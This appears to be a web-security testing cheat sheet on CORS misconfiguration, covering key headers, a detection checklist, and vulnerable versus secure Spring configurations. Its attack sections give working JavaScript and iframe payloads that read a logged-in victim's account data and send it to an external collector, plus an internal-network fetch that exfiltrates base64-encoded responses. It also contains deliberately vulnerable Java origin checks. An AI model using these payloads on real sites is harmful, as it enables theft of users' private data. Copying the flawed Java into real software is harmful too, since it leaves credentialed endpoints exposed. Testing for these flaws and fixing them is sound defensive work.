tactic: Credential Access

**CORS** is a browser security mechanism that controls how web pages on one origin can request resources from another origin. A misconfigured CORS policy allows an attacker's site to make authenticated requests to a target site on behalf of a logged-in victim and read the response  something Same-Origin Policy would normally block.


```
Same-Origin Policy (SOP):   browser blocks cross-origin reads by default
CORS headers:               server tells the browser which origins it trusts

If CORS is misconfigured:
1. Victim is logged into bank.com
2. Victim visits attacker.com (from a phishing link)
3. attacker.com's JS sends a request to bank.com/api/account
4. bank.com responds with Access-Control-Allow-Origin: attacker.com
5. Browser allows attacker.com to read the response → account data leaked
```

**Same origin** requires all three to match:

```
Protocol:  https://
Domain:    example.com
Port:      443
```

## Key Headers

```http
Access-Control-Allow-Origin: https://trusted.com   ← which origins can read responses
Access-Control-Allow-Credentials: true              ← whether cookies are sent
Access-Control-Allow-Methods: GET, POST             ← allowed methods
Access-Control-Allow-Headers: Authorization         ← allowed request headers
Access-Control-Expose-Headers: X-Custom-Header      ← headers readable by JS
```

The dangerous combination is:

```http
Access-Control-Allow-Origin: <attacker-controlled value>
Access-Control-Allow-Credentials: true
```

---

## Injection Points

- Any API endpoint that returns sensitive data
- `Origin` request header — the server reflects it back without validation
- Subdomains used as trusted origins
- `null` origin allowed (triggered by sandboxed iframes, data URIs, redirects)
- Wildcard `*` with credentials (browsers block this — but misconfiguration still signals poor security posture)

---

## Checklist

### Detection

- [ ]  Send a request with a custom `Origin` header and check the response:

```
	Origin: https://evil.com
```

```
If response contains `Access-Control-Allow-Origin: https://evil.com` → reflects origin → vulnerable
```

- [ ]  Try `null` origin:

```
	Origin: null
```

```
If response contains `Access-Control-Allow-Origin: null` → vulnerable to null origin attack
```

- [ ]  Check if `Access-Control-Allow-Credentials: true` is present alongside a reflected origin → full exploit possible
- [ ]  Test subdomain trust:

```
	Origin: https://subdomain.vulnerable-website.com
	Origin: https://evil.vulnerable-website.com
	Origin: https://trusted-subdomain.vulnerable-website.com.evil.com
```

- [ ]  Test prefix/suffix matching bypass:

```
	Origin: https://vulnerable-website.com.evil.com     ← suffix match bypass
	Origin: https://evilvulnerable-website.com          ← prefix match bypass
```

- [ ]  Check if `Vary: Origin` is in the response — indicates per-origin caching, may enable cache poisoning

### Basic Origin Reflection

- [ ]  Server reflects whatever origin is sent → host the following on your exploit server:

```javascript
	<script>
	var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('get', 'https://vulnerable.com/api/account', true);
	req.withCredentials = true;
	req.send();
	function reqListener() {
	    location = '//OASTIFY.COM/log?key=' + this.responseText;
	}
	</script>
```

### Null Origin Attack

- [ ]  If server trusts `null` — trigger null origin using a sandboxed iframe:

```html
	<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
	        src="data:text/html,<script>
	var req = new XMLHttpRequest();
	req.onload = function() {
	    location = 'https://OASTIFY.COM/log?key=' + this.responseText;
};
	req.open('get', 'https://vulnerable.com/api/account', true);
	req.withCredentials = true;
	req.send();
	</script>">
	</iframe>
```

### Trusted Subdomain with XSS

- [ ]  If only subdomains of the target are trusted, find an XSS on any subdomain:

```
	Origin: https://subdomain.vulnerable-website.com
```

- [ ]  Then use that subdomain's XSS to make the cross-origin request from a trusted context:

```javascript
	document.location = "https://subdomain.vulnerable-website.com/page?xss=
	<script>
	var req = new XMLHttpRequest();
	req.onload = function() {
	    location = 'https://OASTIFY.COM?key=' + this.responseText;
	};
	req.open('get', 'https://vulnerable.com/api/account', true);
	req.withCredentials = true;
	req.send();
	</script>"
```

### Internal Network CORS Exposure

- [ ]  Internal services often have permissive CORS — if you have SSRF, pivot to internal CORS endpoints
- [ ]  Scan internal IPs for services with permissive CORS:

javascript

```javascript
	// From browser context, try internal IP ranges
	fetch('http://192.168.0.1/api/config', {credentials: 'include'})
	    .then(r => r.text())
	    .then(d => fetch('https://OASTIFY.COM?d='+btoa(d)))
```

---

## Attack Payloads

**Basic CORS exploit — steal sensitive data via reflected origin:**

```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'https://vulnerable.com/api/account', true);
req.withCredentials = true;
req.send();
function reqListener() {
    location = 'https://OASTIFY.COM/log?key=' + this.responseText;
}
</script>
```

**Fetch-based version:**

```html
<script>
fetch('https://vulnerable.com/api/sensitiveData', {credentials: 'include'})
    .then(r => r.text())
    .then(d => fetch('https://OASTIFY.COM?d=' + btoa(d)));
</script>
```

**Null origin via sandboxed iframe:**

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        src="data:text/html,<script>
fetch('https://vulnerable.com/api/account',{credentials:'include'})
.then(r=>r.text())
.then(d=>location='https://OASTIFY.COM?d='+btoa(d))
</script>">
</iframe>
```

---

## White Box Testing

**Vulnerable, server reflects any origin without validation:**

```java
@GetMapping("/api/account")
public ResponseEntity<?> getAccount(HttpServletRequest request,
                                     HttpServletResponse response,
                                     @AuthenticationPrincipal UserDetails user) {
    String origin = request.getHeader("Origin");

    // reflects whatever origin the attacker sends
    response.setHeader("Access-Control-Allow-Origin", origin);
    response.setHeader("Access-Control-Allow-Credentials", "true");

    return ResponseEntity.ok(accountService.getSensitiveData(user));
}
```

**Vulnerable, regex-based origin check bypassable with crafted domain:**

```java
private boolean isAllowedOrigin(String origin) {
    // intended to allow *.vulnerable.com but regex is flawed
    return origin != null && origin.matches("https://.*vulnerable\\.com");
    // attacker sends: https://evilXvulnerable.com → matches!
    // attacker sends: https://vulnerable.com.evil.com → also matches!
}
```

**Vulnerable, null origin trusted for convenience during development:**

```java
@CrossOrigin(origins = {"https://trusted.com", "null"})
@GetMapping("/api/user")
public ResponseEntity<?> getUser(@AuthenticationPrincipal UserDetails user) {
    return ResponseEntity.ok(userService.getDetails(user));
}
// null origin is exploitable via sandboxed iframes
```

**Secure:**

```java
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    // strict whitelist — hardcoded, not derived from request headers
    private static final Set<String> ALLOWED_ORIGINS = Set.of(
        "https://app.company.com",
        "https://admin.company.com"
    );

    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins(ALLOWED_ORIGINS.toArray(new String[0]))
            .allowedMethods("GET", "POST")
            .allowCredentials(true)
            .maxAge(3600);
            // never use allowedOrigins("*") with allowCredentials(true)
            // never reflect the Origin header value back
            // never trust "null"
    }
}

// For Spring Security
@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowedOrigins(List.of("https://app.company.com"));
    config.setAllowedMethods(List.of("GET", "POST"));
    config.setAllowCredentials(true);
    // validate origin strictly — never use setAllowedOriginPatterns("*")
    // with credentials — this is equivalent to reflecting the origin

    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/api/**", config);
    return source;
}
```

---

## Resources

- [PortSwigger CORS](https://portswigger.net/web-security/cors)
- [HackTricks CORS](https://book.hacktricks.xyz/pentesting-web/cors-bypass)
- [OWASP CORS](https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny)